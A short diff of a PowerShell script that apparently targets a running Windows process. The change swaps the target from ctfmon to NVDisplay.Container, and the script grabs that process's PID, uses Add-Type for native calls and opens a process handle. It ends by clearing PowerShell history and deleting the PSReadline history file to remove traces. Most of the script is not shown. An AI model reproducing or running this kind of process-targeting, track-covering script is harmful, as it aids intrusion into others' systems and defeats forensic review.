@@ -1,4 +1,4 @@
-$proc = Get-Process ctfmon -ErrorAction Stop | Select-Object -First 1
+$proc = Get-Process NVDisplay.Container -ErrorAction Stop | Select-Object -First 1
 $targetPID = $proc.Id  # Use different variable name
 
 Add-Type -TypeDefinition @"
@@ -70,4 +70,5 @@ if ($hProc -ne [IntPtr]::Zero) {
 
 # Clear PowerShell command history
 Clear-History
+
 Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
